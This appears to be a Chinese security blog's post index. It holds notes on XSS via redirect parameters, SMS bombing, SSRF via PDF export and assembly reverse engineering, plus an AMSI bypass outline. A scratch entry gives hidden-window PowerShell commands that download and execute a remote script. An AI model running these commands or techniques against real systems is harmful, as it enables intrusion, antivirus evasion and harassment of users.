如果失败了，就观察与正常的url有什么不同是不是需要test.com关键字 可以尝试这个https://guozhi1.github.io/login?url=javascript://test.com/%0aalert(1) 如果不能跳转就看他和正常的url有什么不同 ","permalink":"http://guozhi1.github.io/posts/tech/src%E6%8C%96%E6%8E%98-xss%E6%BC%8F%E6%B4%9E/","summary":"src挖掘-xss漏洞 漏洞点：url跳转参数，登录url跳转， 退出 注意点：注意url参数 redirect URL redirect_url等参数 前端302跳转可造成xss漏洞window.location 正常的url:https://guozhi1.github.io/login?url=http:/","title":"Src挖掘 Xss漏洞"},{"content":"src挖掘-短信邮箱轰炸 漏洞点：有手机号， 邮箱发送东西的地方\n有的轰炸只有前端限制，可以通过burp抓包进行重发测试\n有些会有后端的时间限制如后端10秒，前端60秒，我们只需要关注后端10秒时间一到立马发包\n并发轰炸在一定时间内，发送数据包可以被服务器受理，只要在这个时间内多次发包就可以造成轰炸\n还有通过token时间戳进行校验的方式我们可以截取获取token的数据包获取token，给第二个数据包完成token校验这种是属于token重发服务器没做后端限时\n","permalink":"http://guozhi1.github.io/posts/tech/src%E6%8C%96%E6%8E%98-%E7%9F%AD%E4%BF%A1%E9%82%AE%E7%AE%B1%E8%BD%B0%E7%82%B8/","summary":"src挖掘-短信邮箱轰炸 漏洞点：有手机号， 邮箱发送东西的地方 有的轰炸只有前端限制，可以通过burp抓包进行重发测试 有些会有后端的时间限制如后端10秒，前端60秒，我们只需要关注后端10秒时间一到立马发包 并发轰炸在一定时间内，发送数据包可以被服务器受理，只要在这个时间内多次发包就可","title":"Src挖掘 短信邮箱轰炸"},{"content":"src挖掘-pdf导出导致的ssrf 漏洞点：pdf导出 在测试pdf导出导致的ssrf有两个方法\nburp抓包进行插入标签 通过js断点调试控制台使用插入 变量=变量.replaceAll(\u0026#34;被替换的值\u0026#34;， \u0026#34;\u0026lt;iframe src=\u0026#34;http://dnslog\u0026#34;\u0026gt;\u0026#34;); 如果是全回显就会返回对应的网址，不是全回显需要注意网页延迟或者请求自己的vps查看vps日志\n之后就可以对内网进行探索。\n","permalink":"http://guozhi1.github.io/posts/tech/src%E6%8C%96%E6%8E%98-pdf%E5%AF%BC%E5%87%BA%E5%AF%BC%E8%87%B4%E7%9A%84ssrf%E6%BC%8F%E6%B4%9E/","summary":"src挖掘-pdf导出导致的ssrf 漏洞点：pdf导出 在测试pdf导出导致的ssrf有两个方法 burp抓包进行插入标签 通过js断点调试控制台使用插入 变量=变量.replaceAll(\u0026#34;被替换的值\u0026#34;， \u0026#34;\u0026lt;iframe src=\u0026#34;http://dnslog\u0026#34;\u0026gt;\u0026#34;); 如果是全回显就会返回对应的网址，不是全回显需要注意网页延迟或者","title":"Src挖掘 Pdf导出导致的ssrf漏洞"},{"content":"前言 知识来源：《加密与解密》\n第一章启动函数 Windows程序在按顺序执行时不是直接从WinMain函数开始的,而是执行别的函数进行初始化,之后调用WinMain函数\n（选择WinMain,交叉引用就可以找到上一级）\n第二章函数 1. 识别函数 编译器都会使用call与ret指令来进行函数的调用与返回。 call可以直接跳到被调用函数的地址段。call与跳转指令有着分别不同的是，call保存返回的地址到栈中，当执行到ret的时候ret就会使用call保存在栈里的地址。 call用于函数的开始，ret用于函数的结束（不是所有ret都代表这函数的结束）。 int Add(int x,int y); main( ) { int a=5,b=6; Add(a,b); return 0; } Add(int x,int y) { return(x+y); } int Add(int x, int y); void main() { 003517A0 push ebp 003517A1 mov ebp,esp 003517A3 sub esp,0D8h 003517A9 push ebx 003517AA push esi 003517AB push edi 003517AC lea edi,[ebp-18h] 003517AF mov ecx,6 003517B4 mov eax,0CCCCCCCCh 003517B9 rep stos dword ptr es:[edi] 003517BB mov ecx,offset _99047FA2_源@cpp (035C000h) 003517C0 call @__CheckForDebuggerJustMyCode@4 (035130Ch) int a = 5, b = 6; 003517C5 mov dword ptr [a],5 003517CC mov dword ptr [b],6 Add(a,b); 003517D3 mov eax,dword ptr [b] 003517D6 push eax 003517D7 mov ecx,dword ptr [a] 003517DA push ecx 003517DB call Add (03511B3h) //函数的开始 003517E0 add esp,8 } int Add(int x, int y) { 00351740 push ebp 00351741 mov ebp,esp 00351743 sub esp,0C0h 00351749 push ebx 0035174A push esi 0035174B push edi 0035174C mov edi,ebp 0035174E xor ecx,ecx 00351750 mov eax,0CCCCCCCCh 00351755 rep stos dword ptr es:[edi] 00351757 mov ecx,offset _99047FA2_源@cpp (035C000h) 0035175C call @__CheckForDebuggerJustMyCode@4 (035130Ch) return (x + y); 00351761 mov eax,dword ptr [x] 00351764 add eax,dword ptr [y] } 00351767 pop edi 00351768 pop esi 00351769 pop ebx 0035176A add esp,0C0h 00351770 cmp ebp,esp 00351772 call __RTC_CheckEsp (0351235h) 00351777 mov esp,ebp 00351779 pop ebp 0035177A ret //函数的结束 2. 函数的参数 函数传参的三种方式，栈方式，寄存器方式，全局变量 利用栈方式\n栈的基础知识\n常用的调用约定 利用寄存器传参 Fastcall特点就快（因为寄存器传参的原因）\n不同编译器的Fastcall也是不一样的 Visual C++,函数参数左边2个不大于4字节（DWORD）参数放在eax，edx寄存器， 寄存器用完用栈，从从右到左压栈，子程序处理堆栈平衡。浮点值，远指针，_int64 总是栈来传递 Borland Delphi/C++ 的 Fastcall 左边3个不大于4字节（DWORD），分别放在eax，edx，ecx寄存器中其余参数按照PASCAL方式压入。 3. 函数的返回值 return返回值 一般情况下函数的返回值会放在eax中，如果处理的大小超过eax寄存器的容量，edx寄存器中。 通过参数按传引方式返回值\n传递两种方式分别是，传值，引用 - 传值，引用\n示例代码 #include \u0026lt;stdio.h\u0026gt; void max(int *a, int *b); void main() { int a = 5; int b = 6; max(\u0026amp;a, \u0026amp;b); //获取变量的内存地址 printf(\u0026#34;a,b中较大的数是：%d\u0026#34;,a); } void max(int *a, int *b) {\t//if 不带{} 就会影响下一行缩进的代码，如果下列多行代码缩进只会影响if下一行的代码，剩下的无条件执行 if (*a \u0026lt; *b) //*a 代表间接变量去到\u0026amp;a的内存地址 *a 就是取到这个内存地址为保存的的值,然后今进行比较 *a = *b; // 把*b的值赋值到*a位置 } 00B818D5 mov ecx,offset _99047FA2_源@cpp (0B8C003h) 00B818DA call @__CheckForDebuggerJustMyCode@4 (0B8131Bh) int a = 5; 00B818DF mov dword ptr [a],5 //a赋值 int b = 6; 00B818E6 mov dword ptr [b],6 //b赋值 max(\u0026amp;a, \u0026amp;b); //获取变量的内存地址 00B818ED lea eax,[b] //第二个参数 lea取的是地址 00B818F0 push eax 00B818F1 lea ecx,[a] //第一个参数 lea取的是地址 00B818F4 push ecx 00B818F5 call max (0B81280h) //调用 max 子程序 00B818FA add esp,8 （_cdecl） max()\n00B81787 mov ecx,offset _99047FA2_源@cpp (0B8C003h) 00B8178C call @__CheckForDebuggerJustMyCode@4 (0B8131Bh) if (*a \u0026lt; *b) 00B81791 mov eax,dword ptr [a] //获取a在内存中的十六进制 00B81794 mov ecx,dword ptr [b] //获取b在内存中的十六进制 00B81797 mov edx,dword ptr [eax] //edx = eax 00B81799 cmp edx,dword ptr [ecx] //判断 *a\u0026lt;*b 是否满足条件 00B8179B jge __$EncStackInitStart+2Bh (0B817A7h) //大于等于跳转 *a = *b; 00B8179D mov eax,dword ptr [a] //a 00B817A0 mov ecx,dword ptr [b] //b 00B817A3 mov edx,dword ptr [ecx] // edx=b 00B817A5 mov dword ptr [eax],edx // a = b 赋值 并且作为返回值 } 00B817A7 pop edi //跳到这什么都不改 00B817A8 pop esi 00B817A9 pop ebx 00B817AA add esp,0C0h 00B817B0 cmp ebp,esp 00B817B2 call __RTC_CheckEsp (0B8123Fh) 00B817B7 mov esp,ebp 00B817B9 pop ebp 00B817BA ret 第三章数据结构 1.局部函数 利用栈存放局部变量\n程序sub esp,8这句话就是为局部变量分配分配内存空间，用[ebp-xxxx]寻址调用这些变量，而参数调用相对于ebp偏移量正的，即[ebp+xxxx]。编译在优化模式下。 当函数退出时，用add esp, 8指令平衡栈，以释放局部变量占用的内存，有的编译器给esp 添加负值进行内存的分配，编译器也有可能会用push reg代替sub esp,4。 局部变量分配与清除栈的方式 形式一 形式二 形式三 add esp,n\n\u0026hellip;.\nsub esp,n add esp,-n\n\u0026hellip;.\nsub esp,-n push reg\n\u0026hellip;\npop reg 利用寄存器存放局部变量 int add(int x,int y); int main(void) { int a=5,b=6; add(a,b); return 0; } int add(int x,int y) { int z; z=x+y; return(z); } .text:004117B0 push ebp .text:004117B1 mov ebp, esp .text:004117B3 sub esp, 0D8h //局部变量申请的栈内存空间 .text:004117B9 push ebx .text:004117BA push esi .text:004117BB push edi .text:004117BC lea edi, [ebp+var_18] .text:004117BF mov ecx, 6 .text:004117C4 mov eax, 0CCCCCCCCh .text:004117C9 rep stosd .text:004117CB mov ecx, offset unk_41C000 .text:004117D0 call j_@__CheckForDebuggerJustMyCode@4 ; __CheckForDebuggerJustMyCode(x) .text:004117D5 mov [ebp+var_8], 5 //局部变量放入var_8中 .text:004117DC mov [ebp+var_14], 6 //局部变量放入var_14中 .text:004117E3 mov eax, [ebp+var_14] //取出var_14放入eax .text:004117E6 push eax .text:004117E7 mov ecx, [ebp+var_8] //取出var_8放入ecx .text:004117EA push ecx .text:004117EB call sub_4112AD .text:004117F0 add esp, 8 //平栈 _cdecl .text:004117F3 xor eax, eax .text:004117F5 pop edi .text:004117F6 pop esi .text:004117F7 pop ebx .text:004117F8 add esp, 0D8h //回收申请的栈内存空间 .text:004117FE cmp ebp, esp .text:00411800 call j___RTC_CheckEsp .text:00411805 mov esp, ebp .text:00411807 pop ebp .text:00411808 retn .text:00411808 _main_0 endp .text:00411808 利用寄存器存放局部变量 除了esp，ebp栈寄存器，其余6个通用寄存器尽可能的存放变量，这样可以减少代码提高程序的执行效率，逆向分析中局部变量生命周期短，必须及时确定当前寄存器的变量是那个变量 2.全局变量 全局变量通常位于.data段，程序访问全局变量时，一般会用固定的硬编码地址对内存地址进行寻址\n如果某个函数的改变了全局变量的值，就能影响其他函数，可以利用全局变量传递参数或者函数的返回值。 全局变量在程序的执行过程中占用内存单元，不像局部变量那样需要的时候才开辟存储单元。\n源码示例\nint z; int add(int x,int y); int main(void) { int a=5,b=6; z=7; add(a,b); return 0; } int add(int x,int y) { return(x+y+z); } main\npush ebp mov ebp, esp sub esp, 0D8h //局部变量申请空间 ....... mov ecx, 6 mov eax, 0CCCCCCCCh rep stosd mov ecx, offset unk_41C000 call j_@__CheckForDebuggerJustMyCode@4 ; __CheckForDebuggerJustMyCode(x) mov [ebp+var_8], 5 //局部变量 mov [ebp+var_14], 6 //局部变量 mov dword_41A138, 7 //全局变量 mov eax, [ebp+var_14] push eax ...... retn add()\npush ebp mov ebp, esp sub esp, 0C0h ...... mov eax, 0CCCCCCCCh rep stosd mov ecx, offset unk_41C000 call j_@__CheckForDebuggerJustMyCode@4 ; __CheckForDebuggerJustMyCode(x) mov eax, [ebp+arg_0] add eax, [ebp+arg_4] add eax, dword_41A138 //全局变量 pop edi ...... call j___RTC_CheckEsp mov esp, ebp pop ebp retn charGPT回答\n可以通过查看汇编代码中的内存地址来判断变量是局部变量还是全局变量。在汇编中，局部变量通常存储在堆栈中，而全局变量则存储在数据段中。通过查看变量的内存地址，如果它在堆栈范围内，则是局部变量，否则是全局变量。\n3.数组 数组在内存中是连续存放的，在汇编访问状态下访问数组一般是通过基址加变址寻址的方式实现的。\n#include \u0026lt;stdio.h\u0026gt; int main(void) { static int a[3]={0x11,0x22,0x33}; int i,s=0,b[3]; for(i=0;i\u0026lt;3;i++) { s=s+a[i]; b[i]=s; } for(i=0;i\u0026lt;3;i++) { printf(\u0026#34;%d\\n\u0026#34;,b[i]); } return 0; } .text:00401009 mov edi, dword_407030[eax] ; ;dword_407030是数组的空间位置, eax 现在是0 指向第一个元素 .text:0040100F add eax, 4 ; eax = 4 这是偏移下一次的地址指向了dword_407034 .text:00401012 add ecx, edi ; ;ecx = dword_407030 数组列表 .text:00401014 cmp eax, 0Ch ; ;if eax == 12 .text:00401017 mov [esp+eax+14h+var_10], ecx ; [esp+eax+14h+var_10] = dword_407030 .text:0040101B jl short loc_401009 ; 等于12的时候就不跳转了 .text:0040101D lea esi, [esp+14h+var_C] ; 数组列表现在到esi中了 .text:00401021 mov edi, 3 ; edi = 3 覆盖了数组元素 .text:00401026 .text:00401026 loc_401026: ; CODE XREF: _main+3A↓j .text:00401026 mov eax, [esi] ; 第二个循环 .text:00401028 push eax .text:00401029 push offset aD ; \u0026#34;%d\u0026#34; .text:0040102E call printf ; 打印一次 .text:00401033 add esp, 8 ; 栈平衡 .text:00401036 add esi, 4 ; 数组指向下一个元素 .text:00401039 dec edi ; edi = 3-1计数器 .text:0040103A jnz short loc_401026 ; 第二个循环 .text:0040103C pop edi .text:0040103D xor eax, eax .text:0040103F pop esi .text:00401040 add esp, 0Ch .text:00401043 retn .text:00401043 _main endp dword_407030\n.data:0040702C align 10h ;[0]第一个元素 .data:00407030 dword_407030 dd 11h ; DATA XREF: _main:loc_401009↑r .data:00407034 db 22h ; \u0026#34; .data:00407035 db 0 .data:00407036 db 0 .data:00407037 db 0 .data:00407038 db 33h ;最后指向的元素 .data:00407039 db 0 .data:0040703A db 0 .data:0040703B db 0 .data:0040703C aD db \u0026#39;%d\u0026#39; ; DATA XREF: _main+29↑o .data:0040703E db 0Ah .data:0040703F db 0 第四章虚函数 虚函数是在程序运行之前定义的函数，虚函数的地址不能在编译时确定，只能在调用即将进行时确定。所有的虚函数引用通常放在一个专用的数组————虚函数表，数组中的每个元素存放的就是类中的虚函数地址。\n调用虚函数时，程序先从虚函数表指针，得到函数地址，再根据取出的函数地址调用函数 对象实例 \u0026ndash;\u0026gt; 函数表 \u0026ndash;\u0026gt; 要调用的函数的地址 #include \u0026lt;stdio.h\u0026gt; class CSum { public: virtual int Add(int a, int b) { return (a + b); } virtual\tint\tSub(int a, int b ) { return (a - b); } }; void main() { CSum*\tpCSum = new CSum ; pCSum-\u0026gt;Add(1,2); pCSum-\u0026gt;Sub(1,2); } .text:00401000 push esi .text:00401001 push 4 ; Size .text:00401003 call ??2@YAPAXI@Z ; new()函数，这里决定了虚表的位置 .text:00401008 add esp, 4 .text:0040100B test eax, eax .text:0040100D jz short loc_401019 .text:0040100F mov dword ptr [eax], offset off_4050A0 ; 这是指向虚表的的指针，eax的地址存放的内容是004050A0 .text:00401015 mov esi, eax ; esi=eax的内存地址 .text:00401017 jmp short loc_40101B ; eax = esi = eax存放在该地址的内容 = 004050A0，[]取的是内容 .text:00401019 ; --------------------------------------------------------------------------- .text:00401019 .text:00401019 loc_401019: ; CODE XREF: _main+D↑j .text:00401019 xor esi, esi .text:0040101B .text:0040101B loc_40101B: ; CODE XREF: _main+17↑j .text:0040101B mov eax, [esi] ; eax = esi = eax存放在该地址的内容 = 004050A0，[]取的是内容 .text:0040101D push 2 .text:0040101F push 1 .text:00401021 mov ecx, esi ; ecx = esi = eax的内存地址 .text:00401023 call dword ptr [eax] ; 第一次调用函数 .text:00401025 mov edx, [esi] ; edx = 004050A0 .text:00401027 push 2 .text:00401029 push 1 .text:0040102B mov ecx, esi .text:0040102D call dword ptr [edx+4] ; 因为在内存中是连续的，所以第二次调用+4的偏移。004050A4 = 4 + (edx = 004050A0) .text:00401030 pop esi .text:00401031 retn .text:00401031 _main endp 现在可以看看004050A0这位置存放的是什么\n.rdata:004050A0 off_4050A0 dd offset sub_401040 ; DATA XREF: _main+F↑o //add函数 .rdata:004050A4 dd offset sub_401050 //sub函数 004050A0、004050A4就是不同函数的地址\n第五章控制流程语句 1. if判断 2. switch #include \u0026lt;stdio.h\u0026gt; int main(void) { int a; scanf(\u0026#34;%d\u0026#34;,\u0026amp;a); switch(a) { case 1 :printf(\u0026#34;a=1\u0026#34;); break; case 2 :printf(\u0026#34;a=2\u0026#34;); break; case 10:printf(\u0026#34;a=10\u0026#34;); break; default :printf(\u0026#34;a=default\u0026#34;); break; } return 0; } .text:0040100A push offset Format ; \u0026#34;%d\u0026#34; .text:0040100F call _scanf ; scanf .text:00401014 add esp, 8 ; 堆栈平衡 .text:00401017 mov ecx, [ebp+var_4] .text:0040101A mov [ebp+var_8], ecx ; switch(a) .text:0040101D cmp [ebp+var_8], 1 ; case 1: .text:00401021 jz short loc_401031 ; print .text:00401023 cmp [ebp+var_8], 2 ; case 2: .text:00401027 jz short loc_401040 .text:00401029 cmp [ebp+var_8], 0Ah ; case 10: .text:0040102D jz short loc_40104F .text:0040102F jmp short loc_40105E 优化后的\n.text:00401006 push offset Format ; \u0026#34;%d\u0026#34; .text:0040100B call _scanf .text:00401010 mov eax, [esp+0Ch+var_4] .text:00401014 add esp, 8 .text:00401017 dec eax .text:00401018 jz short loc_401055 .text:0040101A dec eax .text:0040101B jz short loc_401044 .text:0040101D sub eax, 8 .text:00401020 jz short loc_401033 .text:00401022 push offset aADefault ; \u0026#34;a=default\u0026#34; .text:00401027 call sub_401070 .text:0040102C add esp, 4 .text:0040102F xor eax, eax 最大的区别就是原先使用的时内存寻址现在使用的是寄存器，调用寄存器确实比寻址快，就是寄存器少。\n2.2 switch跳转表 这个switch逆向有点东西，这个因为case多会生成switch跳转表再由跳转表进行跳转\n#include \u0026lt;stdio.h\u0026gt; int main(void) { int a; scanf(\u0026#34;%d\u0026#34;,\u0026amp;a); switch(a) { case 1 :printf(\u0026#34;a=1\u0026#34;); break; case 2 :printf(\u0026#34;a=2\u0026#34;); break; case 3:printf(\u0026#34;a=3\u0026#34;); break; case 4:printf(\u0026#34;a=4\u0026#34;); break; case 5:printf(\u0026#34;a=5\u0026#34;); break; case 6:printf(\u0026#34;a=6\u0026#34;); break; case 7:printf(\u0026#34;a=7\u0026#34;); break; default :printf(\u0026#34;a=default\u0026#34;); break; } return 0; } 假如我们输入的的是7\n.text:00401000 push ecx .text:00401001 lea eax, [esp+4+var_4] .text:00401005 push eax .text:00401006 push offset Format ; \u0026#34;%d\u0026#34; .text:0040100B call _scanf .text:00401010 mov ecx, [esp+0Ch+var_4] ; ecx是存放的是从缓冲区读取的内容 .text:00401014 add esp, 8 .text:00401017 lea eax, [ecx-1] ; switch 7 cases .text:0040101A cmp eax, 6 ; 判断eax是否在六case之内。大于6进行ja跳转就是default分支 .text:0040101D ja short def_40101F ; jumptable 0040101F default case .text:0040101F jmp ds:jpt_40101F[eax*4] ; switch jump 要在4010B0的地址偏移量（eax * 4 =要跳转的分支） 走到00401017就会变成6，然后到0040101A进行比较相等不会触发ja跳转， 到0040101F的时候就是(eax=6)*4 = 24然后转换成16进制得到的偏移量就是18 得到的地址就是0040108C\n.text:0040108C .text:0040108C loc_40108C: ; CODE XREF: _main+1F↑j .text:0040108C ; DATA XREF: .text:jpt_40101F↓o .text:0040108C push offset aA7 ; jumptable 0040101F case 7 这是字符串 .text:00401091 call printf .text:00401096 add esp, 4 .text:00401099 xor eax, eax .text:0040109B pop ecx .text:0040109C retn 转移指令机器码计算（跳过） 条件设置指令 （跳过） 第六章循环语句 for循环\n第七章数学运算符 1. 加法 #include \u0026lt;stdio.h\u0026gt; int main(void) { int a, b; printf(\u0026#34;%d\u0026#34;,a+b+0x78); return 0; } lea 是一条纯计算指令\n.text:00401000 push ecx .text:00401001 mov eax, [esp+4+var_4] ; int a .text:00401005 mov ecx, [esp+4+var_4] ; int b .text:00401009 lea edx, [ecx+eax+78h] ; 计算a+b+0x78,结果放到edx中 .text:0040100D push edx .text:0040100E push offset aD ; \u0026#34;%d\u0026#34; .text:00401013 call printf 除法（这个可以看C++反汇编大揭秘书上讲的比较好） 第八章文本字符串 1. 字符串的存储格式 C字符串：也称ASCII字符串 \u0026ldquo;Z\u0026quot;表示其以\u0026rdquo;\\0\u0026quot;为结束标识符。“\\0”代表ASCII码为0的字符。ASCII为0的字符的时候显示空操作符 DOS字符串： 以$结尾作为终止符，基本已被淘汰 PASCAL字符串：这个字符串没有终止符，而是长度符号字符串的头部定义1个字节，用于指示当前字符串的长度，字符串的长度不能过255字符。 Delphi字符串： 为了解决PASCAL 255长度限制设计的增加了对长度的支持，表示长度扩展到2字节，使字符串最大长度达到65535 四字节的Delphi: 少见，表示长度扩展到4字节字符串长度可以到达4GB 字符寻址指令 mov eax,[00401000] ;直接寻址，把00401000地址的双字节数据放到eax中 mov eax, [ecx] ;间接寻址, 即把ecx中的地址所指的内容放到eax lea eax,[00401000] ;把00401000装到eax中 ","permalink":"http://guozhi1.github.io/posts/blog/32%E4%BD%8D%E9%80%86%E5%90%91%E6%8A%80%E6%9C%AF/","summary":"前言 知识来源：《加密与解密》 第一章启动函数 Windows程序在按顺序执行时不是直接从WinMain函数开始的,而是执行别的函数进行初始化,之后调用WinMain函数 （选择WinMain,交叉引用就可以找到上一级） 第二章函数 1. 识别函数 编译器都会使用call与ret指令来进行函数的调","title":"32位逆向技术"},{"content":"调用约定 知识来源\n允许使用VARARG：表示参数个数可以是不确定\n约定类型 _cdecl(C类规范) pascal stdcall Fastcall 参数传递 从右到左 从左到右 从右到左 寄存器传参与栈 平衡者 调用者 子程序 子程序 子程序 允许使用VARARG 是 否 否 x86 下的调用约定 _cdecl,_stdcall,_fastcall\nint Test(int a,int b,int c,int d,int e) { return a + b + c + d + e; } int main() { Test(1,2,3,4,5); } _cdecl C++下的默认调用约定 Test(1,2,3,4,5); 00A71891 push 5 00A71893 push 4 00A71895 push 3 00A71897 push 2 //第二个参宿 00A71899 push 1 //第一个参宿 00A7189B call Test (0A71398h) 00A718A0 add esp,14h //平栈由调用者执行 _cdecl从右到左进行压栈操作，由调用者进行压栈操作\n_stdcall\n_stdcall 是WindowsApi默认的调用约定 Test(1,2,3,4,5); 00271891 push 5 00271893 push 4 00271895 push 3 00271897 push 2 00271899 push 1 0027189B call Test (02713ACh) //由被调用者平栈 Test_Call\nint _stdcall Test(int a,int b,int c,int d,int e) { 00F41760 push ebp 00F41761 mov ebp,esp 00F41763 sub esp,0C0h 00F41769 push ebx 00F4176A push esi 00F4176B push edi 00F4176C mov edi,ebp 00F4176E xor ecx,ecx 00F41770 mov eax,0CCCCCCCCh 00F41775 rep stos dword ptr es:[edi] 00F41777 mov ecx,offset _99047FA2_源@cpp (0F4C029h) 00F4177C call @__CheckForDebuggerJustMyCode@4 (0F4130Ch) return a + b + c + d + e; 00F41781 mov eax,dword ptr [a] 00F41784 add eax,dword ptr [b] 00F41787 add eax,dword ptr [c] 00F4178A add eax,dword ptr [d] 00F4178D add eax,dword ptr [e] } 00F41790 pop edi 00F41791 pop esi 00F41792 pop ebx 00F41793 add esp,0C0h 00F41799 cmp ebp,esp 00F4179B call __RTC_CheckEsp (0F41235h) 00F417A0 mov esp,ebp 00F417A2 pop ebp 00F417A3 ret 14h //平栈操作 _stdcall 是从右到左进行压栈，但是平栈操作由被被调用者执行\n_fastcall 008F1891 push 6 008F1893 push 5 008F1895 push 4 008F1897 push 3 008F1899 mov edx,2 008F189E mov ecx,1 008F18A3 call Test (08F13C0h) _fastcall 比较特殊他会，从左往右压入参数，但是前两个参数会被赋值到寄存器中，然后由被调者自己平栈\nint _fastcall Test(int a,int b,int c,int d,int e,int w) { 008F1760 push ebp 008F1761 mov ebp,esp 008F1763 sub esp,0D8h 008F1769 push ebx 008F176A push esi 008F176B push edi 008F176C push ecx 008F176D lea edi,[ebp-18h] 008F1770 mov ecx,6 008F1775 mov eax,0CCCCCCCCh 008F177A rep stos dword ptr es:[edi] 008F177C pop ecx 008F177D mov dword ptr [b],edx 008F1780 mov dword ptr [a],ecx 008F1783 mov ecx,offset _99047FA2_源@cpp (08FC029h) 008F1788 call @__CheckForDebuggerJustMyCode@4 (08F130Ch) return a + b + c + d + e; 008F178D mov eax,dword ptr [a] 008F1790 add eax,dword ptr [b] 008F1793 add eax,dword ptr [c] 008F1796 add eax,dword ptr [d] 008F1799 add eax,dword ptr [e] } 008F179C pop edi 008F179D pop esi 008F179E pop ebx 008F179F add esp,0D8h 008F17A5 cmp ebp,esp 008F17A7 call __RTC_CheckEsp (08F1235h) 008F17AC mov esp,ebp 008F17AE pop ebp 008F17AF ret 10h //平栈。因为我多加了个参数导致和之前长度不一样了。 x64 下的调用约定 调用规则是由编译器决定的现在这是由VS平台下的调用约定，这是一种变形的_fastcall。\nTest(1,2,3,4,5); 00007FF631FB187B mov dword ptr [rsp+20h],5 00007FF631FB1883 mov r9d,4 00007FF631FB1889 mov r8d,3 00007FF631FB188F mov edx,2 00007FF631FB1894 mov ecx,1 00007FF631FB1899 call Test (07FF631FB13ACh) 参数从右到左,前四个参数会放到寄存器中分别是,edx,ecx,r8,r9 寄存器。 寄存器的速度是高于栈传参的速度的\nint _cdecl Test(int a,int b,int c,int d,int e) { 00007FF631FB1760 mov dword ptr [rsp+20h],r9d 00007FF631FB1765 mov dword ptr [rsp+18h],r8d 00007FF631FB176A mov dword ptr [rsp+10h],edx 00007FF631FB176E mov dword ptr [rsp+8],ecx 00007FF631FB1772 push rbp 00007FF631FB1773 push rdi 00007FF631FB1774 sub rsp,0E8h 可以看到这个r9,r8,edx,ecx又放入了栈空间，这是为什么？\n寄存器中的值放入栈预留空间，是为了防止参数传递过程中，寄存器需要接收其他值而无法传递参数，或者其他值无法接收的情况。\n仔细查看会发现x64这个调用约定是没有平栈的操作的是因为\n64位下一开始系统会为main（）函数开辟一个很大的栈区，但是main（）函数并未消耗掉这么大的栈区空间，这时候怎么办呢？子函数就会还继续利用main（）函数的栈区空间，所以main（）函数并不用对子函数栈区空间进行清理。\n","permalink":"http://guozhi1.github.io/posts/blog/%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80/","summary":"调用约定 知识来源 允许使用VARARG：表示参数个数可以是不确定 约定类型 _cdecl(C类规范) pascal stdcall Fastcall 参数传递 从右到左 从左到右 从右到左 寄存器传参与栈 平衡者 调用者 子程序 子程序 子程序 允许使用VARARG 是 否 否 x86 下的调用约定 _cdecl,_stdcall,_fastcall int Test(int a,int b,int c,int d,int e) { return a + b + c + d + e; } int main() { Test(1,2,3,4,5); } _cdecl C++下的默","title":"逆向基础-调用约定"},{"content":"AMSI 一个反病毒接口，分析恶意代码。 位置是在C:\\windows\\system32\\amsi.dll\n安全厂商也可以通过接入Amsi进行查杀提高安全性\n接入Amsi的相关厂商\nAMSI的处理流程是：扫描\u0026mdash;-触发\u0026mdash;-病毒库\nASMI绕过方式 不进行绕过，的显示 PS C:\\Users\\32569\u0026gt; amsiutils 所在位置 行:1 字符: 1 + amsiutils + ~~~~~~~~~ 此脚本包含恶意内容，已被你的防病毒软件阻止。 + CategoryInfo : ParserError: (:) [], ParentContainsErrorRecordException + FullyQualifiedErrorId : ScriptContainedMaliciousContent PS C:\\Users\\32569\u0026gt; 长度清零 先对Amsi.dll的使用IDA进行逆向，查调用函数存在一个AmsiScanBuffer函数。\n扫描充满内容的缓冲区以查找恶意软件。 HRESULT AmsiScanBuffer( [in] HAMSICONTEXT amsiContext, [in] PVOID buffer, [in] ULONG length, [in] LPCWSTR contentName, [in, optional] HAMSISESSION amsiSession, [out] AMSI_RESULT *result ); 第三个参数是设置AMSi从缓冲区读取的长度，我们可以把这个设置为0让它读不到东西。\n","permalink":"http://guozhi1.github.io/posts/tech/%E6%96%87%E6%9C%AC%E7%B1%BB%E5%9E%8B%E5%85%8D%E6%9D%80/","summary":"AMSI 一个反病毒接口，分析恶意代码。 位置是在C:\\windows\\system32\\amsi.dll 安全厂商也可以通过接入Amsi进行查杀提高安全性 接入Amsi的相关厂商 AMSI的处理流程是：扫描\u0026mdash;-触发\u0026mdash;-病毒库 ASMI绕过方式 不进行绕过，的显示 PS C:\\Users\\32569\u0026gt; amsiutils 所在位","title":"文本类型免杀"},{"content":"\rSulv\u0026#39;s Blog\r一个记录技术、阅读、生活的博客(源码来源大佬)\r小白工具箱chargpt\r非常好用的工具站\r知识星球（免费）\r做网络安全知识汇总\r小白工具箱github镜像\r非常好用的工具站\r棱角安全社区\r安全社区\r","permalink":"http://guozhi1.github.io/links/","summary":"Sulv\u0026#39;s Blog 一个记录技术、阅读、生活的博客(源码来源大佬) 小白工具箱chargpt 非常好用的工具站 知识星球（免费） 做网络安全知识汇总 小白工具箱github镜像 非常好用的工具站 棱角安全社区 安全社区","title":"🤝友链"},{"content":"关于我\nqq:3256906644@qq.com\n无特长方面仅限于略懂\n","permalink":"http://guozhi1.github.io/about/","summary":"关于我 qq:3256906644@qq.com 无特长方面仅限于略懂","title":"🙋🏻‍♂️关于"},{"content":"echo curl -o 1.ps1 http://172.16.32.67:8000/1.ps1 \u0026gt; 1.bat 运行powershell 脚本 powershell -WindowStyle hidden -exec bypass -file 1.ps1\nset scriptblock \u0026lsquo;powershell -WindowStyle Hidden -Command \u0026ldquo;IEX (New-Object Net.WebClient).DownloadString(\u0026lsquo;http://172.16.32.67:8000/1.ps1\u0026rsquo;)\u0026rdquo;\u0026rsquo; set scriptblock \u0026lsquo;powershell -WindowStyle Hidden -Command \u0026ldquo;wget \u0026ldquo;\u0026rsquo;\n下载并执行 IEX (New-Object Net.WebClient).DownloadString(\u0026lsquo;http://172.16.32.67:8000/1.ps1\u0026rsquo;) 无窗口执行 powershell -WindowStyle Hidden -Command \u0026ldquo;IEX (New-Object Net.WebClient).DownloadString(\u0026lsquo;http://172.16.32.67:8000/1.ps1\u0026rsquo;)\u0026rdquo;\npowershell -WindowStyle Hidden -Command \u0026ldquo;IEX (New-Object Net.WebClient).DownloadString(\u0026lsquo;http://172.16.32.67:8000/1.ps1\u0026rsquo;)\u0026rdquo;\n一、总体工作内容 参与中国移动安全运营建设，完成中国移动网络安全保障，进行中国移动攻防演练值守，对甲方内外网业务系统建设安全屏障。 二、今日进展 1、 csa告警策略调优调优2424条，新增8条，修改3条(已完成) 2、 与业务侧进行沟通解决数据包传输误报问题（进行中） 3、 